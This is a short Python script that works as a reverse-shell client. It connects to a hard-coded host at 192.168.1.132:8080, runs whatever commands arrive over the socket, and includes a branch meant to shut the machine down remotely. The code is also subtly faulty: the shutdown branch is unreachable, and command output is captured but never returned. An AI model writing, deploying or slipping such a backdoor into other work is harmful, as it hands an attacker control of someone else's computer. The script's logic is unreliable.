import subprocess,socket,os
H,P='192.168.1.132',8080
s=socket.socket()
s.connect((H,P))
while True:
 d=s.recv(1024)
 if not d:break
 c=d.decode().strip()
 if c=='exit'or c=='apagar':break
 elif c=='apagar':os.system('shutdown /s /t 0'if os.name=='nt'else'shutdown -h 0')
 o=subprocess.getoutput(c)
s.close()
